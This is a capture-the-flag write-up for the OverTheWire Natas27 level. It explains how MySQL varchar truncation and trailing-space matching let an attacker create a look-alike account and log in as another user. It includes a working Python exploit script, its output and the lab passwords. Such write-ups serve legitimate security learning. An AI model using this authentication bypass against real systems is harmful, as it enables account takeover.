---
category: natas
title: Natas27 - Trailing spaces for varchar in MYSQL
---

website: http://natas27.natas.labs.overthewire.org/ (password: 55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ)

Here is the behavior in this challenge:
1. If a user types in the correct username and password, the credential for the next level will be printed out.
2. If the username exists, but the provided password is not correct, then you will be prompted "Wrong password".
3. If the username doesn't exist at all, then a new account will be created with the provided username and password.

At my first glance, I think it's a SQL injection challenge because the authentication is done by SQL queries.
However, given that `mysql_real_escape_string` is used to filter out those special characters,
I wasn't able to bypass the authentication by injecting any SQL statement.

After going through <a href="https://dev.mysql.com/doc/refman/5.7/en/char.html">this section</a> in MYSQL reference Manual,
I learned a few things:
1. For a `varchar` field, trailing spaces in excess of the column length are truncated prior to insertion and a warning is generated, regardless of the SQL mode in use.
2. `varchar` values are not padded when they are stored. Trailing spaces are retained when values are stored and retrieved, in conformance with standard SQL.

Also I learned that for a `WHERE` clause in MYSQL, the trailing spaces will be ignored when matching a field using "=". Here is an example:

```sql
mysql> CREATE TABLE users (username VARCHAR(4) DEFAULT NULL, password VARCHAR(4) DEFAULT NULL);
Query OK, 0 rows affected (0.01 sec)

mysql> INSERT INTO users (username,password) VALUES ('a', 'a1');
Query OK, 1 row affected (0.00 sec)

mysql> INSERT INTO users (username,password) VALUES ('a         b', 'a2');
Query OK, 1 row affected, 1 warning (0.01 sec)

mysql> SELECT *, LENGTH(username) FROM users WHERE username='a';
+----------+----------+------------------+
| username | password | LENGTH(username) |
+----------+----------+------------------+
| a        | a1       |                1 |
| a        | a2       |                4 |
+----------+----------+------------------+
2 rows in set (0.00 sec)
```

As shown above, I inserted two records into the table.
For the 2nd record, because the username exceeds the max length limitation, the rest characters were truncated,
leaving the letter 'a' and three trailing spaces inserted into the table.
The last SQL statement is much to our surprise:
When trying to query records whose username is "a",
it returns both records though the 2nd row's username is not "a", but a letter 'a' followed by three spaces.
This is because the trailing spaces are ignored when matching a field using "=" in a `WHERE` clause.

Based on the above observation, we can think of this trick:
Let's type in a very long string as the username, e.g., "natas28" followed by 60 spaces and ended with a letter 'a'.
We also type in "1" as the password.
This account will be created in the database and its username will be truncated when its length reaches to 64.
After that, we will have two records in the database:
- natas28
- natas28 (followed by 57 trailing spaces)

We don't know the password for the user "natas28",
but we <em>do</em> know the password for the 2nd user, which is "1".
Then we visit this page again by providing username "natas28" and password "1".
According to what we just learned from the above example,
we will hit the 2nd user because the trailing spaces are ignored when matching the `username` field.
This makes the following line return true:

```php
$query = "SELECT username from users where username='$user' and password='$password' ";
$res = mysql_query($query, $link);
if(mysql_num_rows($res) > 0){
	return True;
} 
```

The complete solution is provided below:

```python
#!/usr/bin/env python3

import requests
from requests.auth import HTTPBasicAuth

url = 'http://natas27.natas.labs.overthewire.org'
auth = HTTPBasicAuth('natas27', '55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ')

username = 'natas28' + ' ' * 60 + '1'
password = '1234'
#print(username)

# Step 1: Create a new user "natas28  " (57 spaces following)
print("Sending a request to create a user similar to natas28...")
resp = requests.post(url, auth=auth, data={"username": username, "password": password})
if 200 != resp.status_code:
    print('failed to send request')
    exit(1)
print(resp.text)

# Step 2: Send a query request for "natas28"
print("Trying to log in...")
resp = requests.post(url, auth=auth, data={"username": 'natas28', "password": password})
print(resp.text)
```

Running the above script returns us the password <small>JWwR438wkgTsNKBbcJoowyysdM82YjeF</small>:
```bash
$ python3 natas27.py
Sending a request to create a user similar to natas28...
... <skipped>

User natas28                                                            1 was created!

... <skipped>

Trying to log in...

... <skipped>

Welcome natas28!<br>Here is your data:<br>Array
(
    [username] =&gt; natas28
    [password] =&gt; JWwR438wkgTsNKBbcJoowyysdM82YjeF
)

... <skipped>
```


<strong>LESSONS LEARNED</strong>

We have covered several topics in this challenge:
1. For a `WHERE` clause in MYSQL, the trailing spaces will be ignored when matching a field using "=".
2. For a `varchar` field, the characters exceeding the column length are truncated prior to insertion.

Just a few additional comments for this challenge.
1. The above notes are true in MYSQL 5.7. However, I noticed that in MYSQL 8, the default behavior is different.
To verify it, you can run my example in MYSQL 8.
2. If you want your `SELECT` query doesn't ignore trailing spaces, you should use the keyword `BINARY`.
For example:

```sql
mysql> SELECT *, LENGTH(username) FROM users WHERE username= BINARY 'a';
+----------+----------+------------------+
| username | password | LENGTH(username) |
+----------+----------+------------------+
| a        | a1       |                1 |
+----------+----------+------------------+
1 row in set (0.00 sec)

mysql> SELECT *, LENGTH(username) FROM users WHERE username= BINARY 'a ';
Empty set (0.00 sec)

mysql> SELECT *, LENGTH(username) FROM users WHERE username= BINARY 'a   ';
+----------+----------+------------------+
| username | password | LENGTH(username) |
+----------+----------+------------------+
| a        | a2       |                4 |
+----------+----------+------------------+
1 row in set (0.00 sec)
```

<strong>References</strong>

MYSQL 5.7 Reference Manual:
1. <a href="https://dev.mysql.com/doc/refman/5.7/en/char.html">The CHAR and VARCHAR Types</a>
2. <a href="https://dev.mysql.com/doc/refman/5.7/en/sql-mode.html">Server SQL Modes</a>

